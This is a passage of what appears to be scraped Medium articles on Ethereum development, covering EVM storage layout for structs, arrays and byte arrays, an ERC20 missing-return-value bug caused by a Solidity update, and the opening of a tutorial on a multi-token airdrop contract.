c;    }    function C() {      tuples[0x1].a = 0x1A;      tuples[0x1].b = 0x1B;      tuples[0x1].c = 0x1C;    }}Compile, and you should see 3 sstore instructions:tag_2:  // ...omitting unoptimized code  0x1a  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7d  sstore  0x1b  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7e  sstore  0x1c  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7f  sstoreNotice that the calculated addresses are the same except for the last digit. The member fields of the Tuple struct are laid out one after another (..7d, ..7e, ..7f).Mappings Don\u2019t PackGiven how mapping is designed, the minimal amount of storage you pay per item is 32 bytes, even if you are only storing 1 byte:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint8) items;    function C() {      items[0xA] = 0xAA;      items[0xB] = 0xBB;    }}And if a value is larger than 32 bytes, you pay for storage in increments of 32 bytes.Dynamic Arrays Are Mappings++In a typical language, an array is just a list of items that sit together in memory. Say you have an array that contains 100 uint8 elements, then it would occupy 100 bytes of memory. In this scheme, it\u2019s cheap to load the whole array in bulk onto CPU cache, and to loop through the items.For most languages, arrays are cheaper than maps. For Solidity, though, array is a more expensive version of mapping. Items of an array would be laid out sequentially in storage, like:0x290d...e5630x290d...e5640x290d...e5650x290d...e566But keep in mind, each access to these storage slots is in fact a key-value lookup in a database. Accessing an array element is no different from accessing a mapping element.Consider the type []uint256, it is essentially the same as mapping(uint256 => uint256) with added features making it \"array-like\":length to indicate how many items there are.Bound-checking. Throws error when reading & writing to an index larger than the length.More sophisticated storage packing behaviour than mapping.Automatic zeroing out of unused storage slots when an array is shrunk.Special optimization for bytes and string to make short arrays (less than 31 bytes) more storage efficient.Simple ArrayLet\u2019s look at an array that stores three items:// c-darray.solpragma solidity ^0.4.11;contract C {    uint256[] chunks;    function C() {      chunks.push(0xAA);      chunks.push(0xBB);      chunks.push(0xCC);    }}The assembly code for array access is too complex to trace. Let\u2019s use the Remix debugger to run the contract:At the end of the simulation, we can see that 4 storage slots are used:key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0x0000000000000000000000000000000000000000000000000000000000000003key: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563value: 0x00000000000000000000000000000000000000000000000000000000000000aakey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564value: 0x00000000000000000000000000000000000000000000000000000000000000bbkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565value: 0x00000000000000000000000000000000000000000000000000000000000000ccThe position of the chunks variable is 0x0, which is used to store the array's length (0x3). Hash the variable's position to find the address for storing array data:# position = 0>>> keccak256(bytes32(0))'290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563'Each item of the array is laid out sequentially from this address (0x29..63, 0x29..64, 0x29..65).Dynamic Array PackingHow about the all important packing behaviour? One advantage of array over mapping is that packing works. Four items of an uint128[] array would fit in exactly two storage slots (plus 1 for storing the length).Consider:pragma solidity ^0.4.11;contract C {    uint128[] s;    function C() {        s.length = 4;        s[0] = 0xAA;        s[1] = 0xBB;        s[2] = 0xCC;        s[3] = 0xDD;    }}Run this in Remix, and the storage at the end looks like:key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0x0000000000000000000000000000000000000000000000000000000000000004key: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563value: 0x000000000000000000000000000000bb000000000000000000000000000000aakey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564value: 0x000000000000000000000000000000dd000000000000000000000000000000ccOnly 3 slots are used, as expected. The length is again stored at 0x0, the position of the storage variable. Four items are packed in two separate storage slots. The starting address for this array is the hash of the position of the variable:# position = 0>>> keccak256(bytes32(0))'290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563'The address now increments once for every two array elements. Looks good!But the assembly code itself is not very well optimized. Since only two storage slots are used, we would hope that the optimizer uses two sstore for the assignments. Unfortunately with bound-checking (and some other stuff) thrown in, it's not possible to optimize the sstore instructions away.Four sstore instructions are used for the assignments:/* \"c-bytes--sstore-optimize-fail.sol\":105:116  s[0] = 0xAA */sstore/* \"c-bytes--sstore-optimize-fail.sol\":126:137  s[1] = 0xBB */sstore/* \"c-bytes--sstore-optimize-fail.sol\":147:158  s[2] = 0xCC */sstore/* \"c-bytes--sstore-optimize-fail.sol\":168:179  s[3] = 0xDD */sstoreByte Arrays & Stringbytes and string are special array types that optimize for bytes and characters respectively. If the length of the array is less than 31 bytes, only one storage slot is used to store the whole thing. Longer byte arrays are represented in much the same way as normal arrays.Let\u2019s see a short byte array in action:// c-bytes--long.solpragma solidity ^0.4.11;contract C {    bytes s;    function C() {        s.push(0xAA);        s.push(0xBB);        s.push(0xCC);    }}Since the array is only 3 bytes (less than 31 bytes), it occupies just one storage slot. Run in Remix, the storage:key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0xaabbcc0000000000000000000000000000000000000000000000000000000006The data 0xaabbcc... is stored from left to right. The 0's that follow are empty data. The last byte 0x06 is the encoded length of the array. The formula is encodedLength / 2 = length. In this case the actual length is6 / 2 = 3.A string works in exactly the same way.A Long Byte ArrayIf the amount of data is greater than 31 bytes, a byte array is like []byte. Let look at byte array that's 128 bytes long:// c-bytes--long.solpragma solidity ^0.4.11;contract C {    bytes s;    function C() {        s.length = 32 * 4;        s[31] = 0x1;        s[63] = 0x2;        s[95] = 0x3;        s[127] = 0x4;    }}Run in Remix, and we see that four slots are used in storage:0x0000...00000x0000...01010x290d...e5630x0000...00010x290d...e5640x0000...00020x290d...e5650x0000...00030x290d...e5660x0000...0004The slot 0x0 is no longer used to store data. The whole slot now stores the encoded array length. To get the actual length, do length = (encodedLength - 1) / 2. In this case the length is128 = (0x101 - 1) / 2. The actual bytes are stored in0x290d...e563, and the slots that follow sequentially.The assembly code for byte array is quite big. Aside from the normal bound-checking and array resizing stuff, it also needs to encode/decode length, as well as taking care to convert between long and short byte arrays.Why encode the length? Because the way it\u2019s done, there\u2019s a simple way to test if a byte array is short or long. Notice that the encoded length is always odd for a long array, and even for a short array. The assembly only needs to look at the last bit to see whether it is zero (even/short) or non-zero (odd/long).ConclusionPeeking into the inner workings of the Solidity compiler, we see that familiar data structures like mappings and arrays are radically different from conventional programming languages.To recap:Arrays are like mappings, not very efficient.More complex assembly code than mappings.Better storage efficiency than mapping for smaller types (byte, uint8, string).Assembly not optimized very well. Even with packing, there\u2019s one sstore per assignment.The EVM storage is a key-value database, much like git. If you change anything, the checksum at the root node would change. If two root nodes have the same checksum, the stored data is guaranteed to be the same.To appreciate how quirky Solidity & EVM is, imagine that each element of the array is its own file in a git repository. When you change the value of an array element, you are in fact creating a git commit. When iterating through an array, you can\u2019t load the whole array at once, you have to look into the repository and find each file separately.Not only that, each file is limited to 32 bytes! Because we need to chop up data structures into 32 bytes chunks, Solidity\u2019s compiler is complicated by all kinds of logic and optimization tricks, all done in assembly.Yet the 32 bytes limit is entirely arbitrary. The backing key-value store can store any number of bytes with a key. Perhaps in the future we could add a new EVM instruction to store arbitrary bytes with a key.For now, the EVM storage is a key-value database prentending to be a 32 bytes array.See ArrayUtils::resizeDynamicArray for a taste of what the compiler is up to when resizing an array. Normally data structures would be done in the language as part of a standard library, but in Solidity it\u2019s baked into the compiler.If you enjoyed this article, you should follow me on Twitter @hayeah.In this article series about the EVM I write about:Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.How ABI Encodes External Method Calling.What is going on when a new contract is created.To learn more about the Solidity and EVM, subscribe to my weekly tutorial:", "responses": 3, "tags": ["Ethereum", "Blockchain"]}, {"title": "Missing return value bug \u2014 At least 130 tokens affected", "post_link": "https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca?source=search_post", "author_name": "Lukas Cremer", "author_link": "https://medium.com/@lukas.berlin", "publish_date": "2018-06-05", "last_modified_date": "2018-12-12", "readtime": "5.03", "claps": 1171, "voters": 128, "content": "Missing return value bug \u2014 At least 130 tokens affectedLukas CremerFollowJun 5, 2018 \u00b7 6 min readtl;dr There is a critical bug in a lot of ERC20 token contracts that surfaced due to a recent Solidity update.ERC BasicsThe ERC20 standard is by far the most common token standard on the Ethereum platform. ERC20 is defined as an interface that specifies which functions and events have to be implemented in a smart contract to be ERC20 compliant. Currently, these are following:What should the transfer function of an ERC20 contract return?During the development of ERC20, there were lengthy discussions about the correct return values of the transfer function of an ERC20 contract. There were basically two camps in this discussion. One side argued that the transfer function should return false if the transfer failed to allow error handling in the calling contract. The other side claimed that an ERC20 should revert the transaction in case of failure to ensure safety. This matter was never really settled and both behaviors are now considered to be ERC20 compliant. The most common behavior is a revert in case of failure, especially since OpenZeppelin implemented their ERC20 token by this means.All this has little to do with the actual bug I want to describe, but may be helpful to provide some context.The BugIt turned out that a significant percentage of ERC20 token behave in yet another way regarding the return values of the transfer function.The transfer functions of these token contracts (let\u00b4s call them BadTokens) do not return anything. The interface they are complying to, looks like this:This interface is not complying to the ERC20 standard, which means that the contracts implementing this interface are not ERC20 tokens.One important point of having a token standard, is to enable other smart contracts to interact with many different token contracts through a common interface. There are many different contracts that use this feature of an ERC20 token. Decentralized exchanges can send tokens, crowdsale contracts can accept ERC20 token as payment and so on. Now the interesting question is, what happens if a contract that expects an ERC20 interface is trying to interact with a BadToken that is not ERC20 compliant?Let\u00b4s have a look at this scenario:In Solidity a function selector is derived from its function name and the type of the input parameters.selector = bytes4(sha3(\u201ctransfer()\u201d))The return value of a function is not part of a function selector. So a function transfer() without a return value and a function transfer() returns(bool) have the same function selector but they are still different. If you would trycontract BadToken is Token {                         function transfer() {}         }the compiler would not accept the transfer() function as an implementation of the Token interface, because of the missing return value. So the GoodToken is an implementation of the Token interface, the BadToken is not.What happens if we call it anyway?The calling contract sends an external call to the BadToken, which processes the call, makes the transfer and does not return a Boolean return value. The calling contract now looks up the return value in the memory, but since the token did not write a return value it will take whatever it finds in this memory position as the return value of the external call.This is already pretty bad: taking some data that happens to be in a memory slot as a return value is not a good idea.By sheer coincidence this problem didn\u2019t surface in the past because the memory slot in which the caller expected the return value, overlapped with the memory slot, the function selector of the call was stored in. This was interpreted by the EVM as the return value \u201ctrue\u201d. And so, by pure luck, the EVM behaved like the programmers intended it to behave.But this is not the case for newer smart contracts.What changed?Since the Byzantium hard fork last October, the EVM has a new opcode, called RETURNDATASIZE. This opcode stores (as the name implies) the size of the returned data of an external call. This is a very useful opcode, since it allows to return dynamically sized arrays in function calls.This opcode was adopted in the Solidity 0.4.22 update (when set to post-Byzantium mode, which is the default). Now, the code checks the size of the return value after an external call and reverts the transaction in case the return data is shorter than expected. This is a much safer behavior than reading data from some memory slot. But this new behavior is a huge problem for our BadTokens.Who is affected.To get an idea of how widespread this issue is, I took the list of ERC20 tokens listed on Etherdelta and checked their API verified on Etherscan. Thereby, I found 130 affected token contracts.There are some big names on this list:The biggest tokens (by Market Cap) on the list are:Binance Coin $1.587.146.847OmiseGO $1.127.641.627But there are a lot of small and mid-sized tokens on this list, too.What\u00b4s the risk?As described above, the biggest risk is that a smart contract that is compiled with solc \u2265 0.4.22 , which is expecting an ERC20 interface, will not be able to interact with our BadTokens. This could mean that tokens which are send to such a contract, will be stuck there forever even if the contract has a function to transfer ERC20 token. There are many different scenarios where contracts, handling ERC20 tokens would run into this bug. One example is, that you would not be able to use decentralized exchanges that compiled its contract with solc \u2265 0.4.22 with your BadToken.How could this happen?This issue is clearly a bug in the token contract. The change in Solidity only brought this bug to daylight. One reason why there are so many BadTokens is that at one point OpenZeppelin implemented the wrong interface in their framework. Between 17 March 2017 and 13 July 2017 the interface was wrong:https://github.com/OpenZeppelin/openzeppelin-solidity/blob/52120a8c428de5e34f157b7eaed16d38f3029e66/contracts/token/ERC20Basic.solSo, most of the BadTokens used the faulty OpenZeppelin implementation of the ERC20 interface.So now what?There are two ways to fix this bug and I think these need to be approached in parallel.On one hand, the teams of the affected token contracts need to fix their contracts. This could be done by redeploying the token contract or by updating the contract, if the token contract has some ability to update the contract programmed into it.Another possibility is wrapping the token contract with a contract that calls the bad transfer function and returns a good transfer function. There are different proposals for such wrappers. e.g.On the other hand, developers who are writing contracts that handle ERC20 tokens need to be aware of this bug, so they can anticipate the unexpected behavior of the BadTokens and handle them. This could be done by expecting the BadERC20 interface and checking the return data after the call to determine whether we called a GoodToken or a BadToken.ConclusionI think there is no reason to panic at the moment, because the updating cycle of decentralized exchanges and other big contracts is quite long. Nevertheless, this bug needs to be fixed as soon as possible.There is also a very informative article about this issue from Christian. https://medium.com/@chris_77367/explaining-unexpected-reverts-starting-with-solidity-0-4-22-3ada6e82308cYou can read the issue on github here: https://github.com/ethereum/solidity/issues/4116Thanks to Christian , G\u00e9rard and Eva for helping with this articleAbout lukas-berlinI\u00b4m a solidity developer and auditor based in Berlin. I\u00b4m also the CTO of sicos.io and an organizer of the Solidity Berlin meetup. (www.solidity.berlin)", "responses": 5, "tags": ["Ethereum", "Solidity", "Token", "Smart Contracts", "Erc20"]}, {"title": "Diving Into The Ethereum VM Part 2 \u2014 How I Learned To Start Worrying And Count The Storage Cost", "post_link": "https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7?source=search_post", "author_name": "Howard", "author_link": "https://medium.com/@hayeah", "publish_date": "2017-08-14", "last_modified_date": "2018-06-18", "readtime": "8.93", "claps": 1026, "voters": 130, "content": "Diving Into The Ethereum VM Part 2 \u2014 How I Learned To Start Worrying And Count The Storage CostHowardFollowAug 14, 2017 \u00b7 9 min readMicron MT4C1024In the first article of this series we\u2019ve peeked into the assembly code of a simple Solidity contract:contract C {    uint256 a;    function C() {      a = 1;    }}This contract boils down to an invocation of the sstore instruction:// a = 1sstore(0x0, 0x1)The EVM stores the value 0x1 in the storage position 0x0.Each storage position can store exactly 32 bytes (or 256 bits).If this seems unfamiliar, I recommend reading: Diving Into The Ethereum VM Part 1 \u2014 Assembly & BytecodeIn this article we\u2019ll start to look into how Solidity uses chunks of 32 bytes to represent more complex data types like structs and arrays. We\u2019ll also see how storage could be optimized, and how optimization could fail.In a typical programming language it\u2019s not terribly useful to understand how data types are represented at such a low-level. In Solidity (or any EVM language) this knowledge is crucial because storage access is super expensive:sstore costs 20000 gas, or ~5000x more expensive than a basic arithmetic instruction.sload costs 200 gas, or ~100x more expensive than a basic arithmetic instruction.And by \u201ccost\u201d, we are talking about real money here, not just milliseconds of performance. The cost of running & using your contract is likely to be dominated by sstore and sload!Parsecs Upon Parsecs of TapeTuring Machine. Source: http://raganwald.com/It takes two essential ingredients to build an Universal Computation Machine:A way to loop, either jump or recursion.An infinite amount of memory.The EVM assembly code has jump, and the EVM storage provides the infinite memory. That\u2019s enough for EVERYTHING, including simulating a world that runs a version of Ethereum, which is itself simulating a world that runs Ethereum that is\u2026Diving Into The Microverse BatteryThe EVM storage for a contract is like an infinite ticker tape, and each slot of the tape holds 32 bytes. Like this:[32 bytes][32 bytes][32 bytes]...We\u2019ll see how data lives on the infinite tape.The length of the tape is 2\u00b2\u2075\u2076, or ~10\u2077\u2077 storage slots per contract. The number of particles of the observable universe is 10\u2078\u2070. About 1000 contracts would be enough to hold all those protons, neutrons, and electrons. Don\u2019t believe the marketing hype, as it is a lot shorter than infinity.The Blank TapeThe storage is initially blank, defaulting to zero. It doesn\u2019t cost you anything to have an infinite tape.Let\u2019s look at a simple contract to illustrate the zero-value behaviour:pragma solidity ^0.4.11;contract C {    uint256 a;    uint256 b;    uint256 c;    uint256 d;    uint256 e;    uint256 f;    function C() {      f = 0xc0fefe;    }}The layout in storage is simple.The variable a in position 0x0The variable b in position 0x1And so on\u2026The key question: if we only use f, how much do we pay for a, b, c, d, e?Let\u2019s compile and see:$ solc --bin --asm --optimize c-many-variables.solThe assembly:// sstore(0x5, 0xc0fefe)tag_2:  0xc0fefe  0x5  sstoreSo a storage variable declaration doesn\u2019t cost anything, as there\u2019s no initialization necessary. Solidity reserves a position for that store variable, and you pay only when you store something in it.In this case, we are only paying for storing to 0x5.If we were writing assembly by hand, we could choose any storage position without having to \u201cexpand\u201d the storage:// Writing to an arbitrary positionsstore(0xc0fefe, 0x42)Reading ZeroNot only can you write anywhere in storage, you can read from anywhere immediately. Reading from an uninitialized position simply returns 0x0.Let\u2019s see a contract that reads from a, an uninitialized position:pragma solidity ^0.4.11;contract C {    uint256 a;    function C() {      a = a + 1;    }}Compile:$ solc --bin --asm --optimize c-zero-value.solThe assembly:tag_2:  // sload(0x0) returning 0x0  0x0  dup1  sload  // a + 1; where a == 0  0x1  add  // sstore(0x0, a + 1)  swap1  sstoreNotice that it\u2019s valid to generate code that sload from an uninitialized position.We can be smarter than the Solidity compiler, however. Since we know that tag_2 is the constructor, and a had never been written to, we can replace the sload sequence with 0x0 to save 5000 gas.Representing StructLet\u2019s look at our first complex data type, a struct that has 6 fields:pragma solidity ^0.4.11;contract C {    struct Tuple {      uint256 a;      uint256 b;      uint256 c;      uint256 d;      uint256 e;      uint256 f;    }    Tuple t;    function C() {      t.f = 0xC0FEFE;    }}The layout in storage is the same as state variables:The field t.a in position 0x0The field t.b in position 0x1And so on\u2026Like before, we can write directly to t.f without paying for initialization.Let\u2019s compile:$ solc --bin --asm --optimize c-struct-fields.solAnd we see the exact same assembly:tag_2:  0xc0fefe  0x5  sstoreFixed Length ArrayNow let\u2019s declare a fixed length array:pragma solidity ^0.4.11;contract C {    uint256[6] numbers;    function C() {      numbers[5] = 0xC0FEFE;    }}Since the compiler knows exactly how many uint256 (32 bytes) there are, it can simply lay out the elements of the array in storage one after another, just as it did for store variables and structs.In this contract, we are again storing to the position 0x5.Compile:$ solc --bin --asm --optimize c-static-array.solThe assembly:tag_2:  0xc0fefe  0x0  0x5tag_4:  add  0x0tag_5:  pop  sstoreIt is slight longer, but if you squint a little, you\u2019d see that it\u2019s actually the same. Let\u2019s optimize this further by hand:tag_2:  0xc0fefe  // 0+5. Replace with 0x5  0x0  0x5  add  // Push then pop immediately. Useless, just remove.  0x0  pop  sstoreRemoving the tags and spurious instructions, we arrive at the same bytecode sequence again:tag_2:  0xc0fefe  0x5  sstoreArray Bound CheckingWe\u2019ve seen that fixed-length arrays has the same storage layout as struct and state variables, but the generated assembly code is different. The reason is that Solidity generates bound-checking for array access.Let\u2019s compile the array contract again, turning off the optimizations this time:$ solc --bin --asm c-static-array.solThe assembly is commented below, printing the machine state after each instruction:tag_2:  0xc0fefe    [0xc0fefe]  0x5    [0x5 0xc0fefe]  dup1  /* array bound checking code */  // 5 < 6  0x6    [0x6 0x5 0xc0fefe]  dup2    [0x5 0x6 0x5 0xc0fefe]  lt    [0x1 0x5 0xc0fefe]  // bound_check_ok = 1 (TRUE)  // if(bound_check_ok) { goto tag5 } else { invalid }  tag_5    [tag_5 0x1 0x5 0xc0fefe]  jumpi    // Test condition is true. Will goto tag_5.    // And `jumpi` consumes two items from stack.    [0x5 0xc0fefe]  invalid// Array access is valid. Do it.// stack: [0x5 0xc0fefe]tag_5:  sstore    []    storage: { 0x5 => 0xc0fefe }We see the the bound-checking code now. We\u2019ve seen that the compiler is able to optimize some of this stuff, but not perfectly.Later in this article we will to see how array bound-checking interferes with compiler optimization, making fixed-length arrays much less efficient than store variables or structs.Packing BehaviourStorage is expensive (yayaya I\u2019ve said it a million times). One key optimization is to pack as much data into one 32 bytes slot as possible.Consider a contract that has four store variables, 64 bits each, adding up to 256 bits (32 bytes) altogether:pragma solidity ^0.4.11;contract C {    uint64 a;    uint64 b;    uint64 c;    uint64 d;    function C() {      a = 0xaaaa;      b = 0xbbbb;      c = 0xcccc;      d = 0xdddd;    }}We\u2019d expect (hope) that the compiler uses one sstore to put these in the same storage slot.Compile:$ solc --bin --asm --optimize c-many-variables--packing.solThe assembly:tag_2:    /* \"c-many-variables--packing.sol\":121:122  a */  0x0    /* \"c-many-variables--packing.sol\":121:131  a = 0xaaaa */  dup1  sload    /* \"c-many-variables--packing.sol\":125:131  0xaaaa */  0xaaaa  not(0xffffffffffffffff)    /* \"c-many-variables--packing.sol\":121:131  a = 0xaaaa */  swap1  swap2  and  or  not(sub(exp(0x2, 0x80), exp(0x2, 0x40)))    /* \"c-many-variables--packing.sol\":139:149  b = 0xbbbb */  and  0xbbbb0000000000000000  or  not(sub(exp(0x2, 0xc0), exp(0x2, 0x80)))    /* \"c-many-variables--packing.sol\":157:167  c = 0xcccc */  and  0xcccc00000000000000000000000000000000  or  sub(exp(0x2, 0xc0), 0x1)    /* \"c-many-variables--packing.sol\":175:185  d = 0xdddd */  and  0xdddd000000000000000000000000000000000000000000000000  or  swap1  sstoreA lot of bit-shuffling that I can\u2019t decipher, and I don\u2019t care. The key thing to notice is that there\u2019s only one sstore.Optimization success!Breaking The OptimizerIf only the optimizer could work so well all the time. Let\u2019s break it. The only change we make is that we use helper functions to set the store variables:pragma solidity ^0.4.11;contract C {    uint64 a;    uint64 b;    uint64 c;    uint64 d;    function C() {      setAB();      setCD();    }    function setAB() internal {      a = 0xaaaa;      b = 0xbbbb;    }    function setCD() internal {      c = 0xcccc;      d = 0xdddd;    }}Compile:$ solc --bin --asm --optimize c-many-variables--packing-helpers.solThe assembly output is too much. We\u2019ll ignore most of the detail and focus on the structure:// Constructor functiontag_2:  // ...  // call setAB() by jumping to tag_5  jumptag_4:  // ...  // call setCD() by jumping to tag_7  jump// function setAB()tag_5:  // Bit-shuffle and set a, b  // ...  sstoretag_9:  jump  // return to caller of setAB()// function setCD()tag_7:  // Bit-shuffle and set c, d  // ...  sstoretag_10:  jump  // return to caller of setCD()Now there are now two sstore instead of one. The Solidity compiler can optimize within a tag, but not across tags.Calling functions could cost you far more, not so much because function calls are expensive (they are only jump instructions), but because sstore optimization could fail.To solve this problem, the Solidity compiler needs to learn how to inline functions, essentially getting the same code as not calling functions:a = 0xaaaa;b = 0xbbbb;c = 0xcccc;d = 0xdddd;If we peruse the complete assembly output, we\u2019d see that the assembly code for the functions setAB() and setCD() is included twice, bloating the size of the code, costing you extra gas to deploy the contract. We'll talk about this later when learning about the contract lifecycle.Why The Optimizer BreaksThe optimizer doesn\u2019t optimize across tags. Consider \u201c1+1\u201d, it can be optimized to 0x2 if under the same tag:// Optimize OK!tag_0:  0x1  0x1  add  ...But not if the instructions are separated by tags:// Optimize Fail!tag_0:  0x1  0x1tag_1:  add  ...This behaviour is true as of Version 0.4.13. Could change in the future.Breaking The Optimizer, AgainLet\u2019s see another way the optimizer fails. Does packing work for a fixed length array? Consider:pragma solidity ^0.4.11;contract C {    uint64[4] numbers;    function C() {      numbers[0] = 0x0;      numbers[1] = 0x1111;      numbers[2] = 0x2222;      numbers[3] = 0x3333;    }}Again, there are four 64 bits numbers we\u2019d hope to pack into one 32 bytes storage slot, using exactly one sstore instruction.The compiled assembly is too long. Let\u2019s instead just count the number of sstore and sload instructions:$ solc --bin --asm --optimize c-static-array--packing.sol | grep -E '(sstore|sload)'  sload  sstore  sload  sstore  sload  sstore  sload  sstoreOh noes. Even though this fixed-length array has exactly the same storage layout as equivalent struct or store variables, optimization fails. It now takes four pairs of sload and sstore.A quick look at the assembly code reveals that each array access has bound checking code, and organized under different tags. But tag boundaries break optimization.There is a small consolation though. The 3 extra sstore instructions are cheaper than the first:sstore costs 20000 gas for first write to a new position.sstore costs 5000 gas for subsequent writes to an existing position.So this particular optimization fail costs us 35k instead of 20k, 75% extra.ConclusionIf the Solidity compiler can figure out the size of store variables, it simply lays them out one after another in storage. If possible, the compiler packs the data tightly in chunks of 32 bytes.To summarize the packing behaviour we\u2019ve seen so far:Store variables: yes.Struct fields: yes.Fixed-length arrays: no. In theory, yes.Because storage access costs so much, you should think of the store variables as your database schema. When writing contracts, it could be useful to do small experiments, and examine the assembly to find out if the compiler is optimizing properly.We can be sure that the Solidity compiler will improve in the future. For now, unfortunately, we can\u2019t trust its optimizer blindly.It pays, literally, to understand your store variables.In this article series about the EVM I write about:Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.How ABI Encodes External Method Calling.What is going on when a new contract is created.If you\u2019d like to learn more about the EVM, subscribe to my weekly tutorial:", "responses": 8, "tags": ["Ethereum", "Blockchain"]}, {"title": "How I built a multi-token Airdrop Central to distribute ERC20 tokens", "post_link": "https://medium.com/free-code-camp/how-i-built-a-multi-token-airdrop-central-to-distribute-erc20-tokens-cb70b6218b5c?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://medium.com/@pabloruiz55", "publish_date": "2017-12-11", "last_modified_date": "2018-06-20", "readtime": "9.24", "claps": 941, "voters": 111, "content": "Image sourceHow I built a multi-token Airdrop Central to distribute ERC20 tokensPablo RuizFollowDec 11, 2017 \u00b7 10 min readEvery now and then, while browsing questions on Ethereum Stack Exchange \u2014 the go-to site for questions related to Solidity development, and for me, the go-to place to contribute to the dev community \u2014 I see the following question:\u201cHow to do an airdrop of my tokens.\u201dIn the context of a Token Sale campaign, an Airdrop refers to sending tokens to multiple accounts for free. This is a trend that has recently become popular to promote upcoming ICOs / Token Crowdsales.Some of these airdrops are done as a time and/or volume based campaign, where people are told that if they own some amount of tokens by some date, they will receive more tokens.Some other airdrops are even done in an unsolicited manner. Teams will just send tokens to random accounts from a list. If you were on that list and you happen to check your balance for that token, you will see them.There are also a few sites that allow users to subscribe to find out how to willingly participate in these airdrops. They will typically ask you to subscribe to some mailing list or give you referral links to participate in token sales.How Token Airdrops are Typically DoneThere are a few ways these token airdrops are handled by teams.Some of them do it manually. They just build a list on an spreadsheet, and then proceed to manually transfer the tokens to each account.Others build a very simple smart contract, which receives an array of addresses, and proceeds to transfer some amount of tokens to each of those address.Others also use a smart contract to allow people to proactively withdraw tokens they have been assigned beforehand.I haven\u2019t yet seen a solution that allows people to just sign up and then receive any tokens sent by multiple teams.The Token Airdrop CentralIn this article, I\u2019m going to describe how I built a smart contract that works as a central for airdrops. Basically, people can subscribe to this airdrop central, and from then on, when a team performs an airdrop to the central, the subscribed users can withdraw their share of the airdrop for free.On the other hand, teams doing airdrops can just send the tokens to this central which will get evenly distributed to all users subscribed at that time.The Airdrop Central keeps 2% of those tokens as a fee for the service.Its important to notice that this Airdrop Central allows any teams to drop their tokens for the existing community to withdraw. The list of users is shared among all teams. So the more people each team reaches out to individually, the more people that will benefit from tokens airdropped by other teams.As a side note, it\u2019s worth mentioning that this solution is not completely decentralized, as it depends on an owner to review and approve submissions. This mechanism is in place to prevent potential security issues related to having to trust unknown 3rd party contracts (ERC20 tokens submitted by teams). I couldn\u2019t allow just anyone to submit any contract address, which could contain malicious code instead of the typical ERC20 token.The Airdrop Central has not been deployed on any network yet, as I\u2019d like to thoroughly test it first. In the meantime, you can check the code (and even submit any bugs or suggestions) on my Github Repository:If you are a user wanting to receive tokens, please add your address to this list. When I deploy the Airdrop Central to the mainnet, I\u2019ll add your account to it so you can receive tokens from the get-go. Once teams start doing airdrops to it, you will be able to withdraw tokens for free.If you are a team looking into an easy way to send tokens to promote your Token Sale, please follow the instructions below to start the verification process.Once I deploy the Airdrop Central to the mainnet, I\u2019ll accept/reject the submissions. Open an Issue on the Airdrop Central\u2019s Github Repository with the tag \u201cSubmission\u201d and the following title: [Token Symbol] \u2014 [Token Name] \u2014 [Token Address] \u2014 [Token Owner Address]. The token should already be deployed on the mainnet so the smart contract can be reviewed. An admin will notify you when it gets approved by leaving you a message on the Github Issue you created.How it WorksFor the end users: Users sign up to the Token Central. Then, when a team airdrops tokens, the users can check how many of them they were awarded (based on how many were sent and how many users were signed to the central at that time) and withdraw them. All they need to know to withdraw their share of the tokens is the address of the token contract.For the teams: Submissions first have to be approved. Given that the Airdrop Central contract interacts with unknown and potentially harmful 3rd party contracts, it has to be approved by the central\u2019s owner or designated admins before a token is accepted. The admins will basically have to check that the address submitted corresponds to an ERC20 compliant token contract and that it doesn\u2019t contain any malicious code.Once the team and token are approved, they can make as many airdrops as they want using the same account and token address. The owner of the central keeps 2% of the submitted tokens as a fee for using the service, and the rest are stored within the contract, available for the users to withdraw. Each airdrop has an expiration date. Tokens not withdrawn by users by that date can be retrieved by the team.Using the Airdrop Central ContractFor end users:Sign up to the Airdrop Central by executing the signUpForAirdrops() function. This will subscribe you to future airdrops.Call getTokensAvailableToMe(address _tokenAddress) to check how many tokens you are entitled to for the given token, based on whether or not the corresponding airdrop expired and how many tokens you already withdrew.If you want to withdraw your tokens, call withdrawTokens(address _tokenAddress) which will check the tokens available with the same logic as above and transfer them.You should now be able to call balanceOf(address _owner) on the token contract to see the tokens added to your balance.For teams:Submit your token information as explained above.Once the submission is approved, you\u2019ll be able to do the airdrop. First, you need to give an allowance for the tokens to the Airdrop Central on your ERC20 token. You can do that by calling approve() on the token and passing the address of the Airdrop Central and the amount to allow. Don\u2019t do this until your submission has been approved. Furthermore, only call approve() \u2014 don\u2019t call transfer() or you will lose your tokens.Once you have given the Airdrop Central an allowance on the tokens you own, you can initiate the airdrop by calling the function airdropTokens(address _tokenAddress, uint _totalTokensToDistribute, uint _expirationTime) where:address _tokenAddress is the address of the token you submitted.uint _totalTokensToDistribute is the total tokens to distribute.uint _expirationTime is how long (in seconds) will the airdrop last.Optional step: You can execute returnTokensToAirdropper(address _tokenAddress) to get back the tokens that were not collected once the expiration date has been reached.Regarding token distribution:_totalTokensToDistribute is the total amount of tokens you want to distribute. The function will take care of adding the necessary decimals, obtained from the token contract. For example: If you want to airdrop 100 tokens, just enter 100, no matter how many decimals your token has.The tokens you send will be evenly distributed between all users currently registered. You can check how many registered users the central currently has by calling userSignupCount() in order to approximately figure out how many tokens you want to distribute to each.Users that sign up after the airdrop has been submitted won\u2019t receive tokens from that submission.Building the Airdrop CentralThe complete, fully commented code can be found on my Github Repository.What follows is a detailed explanation of the most important parts 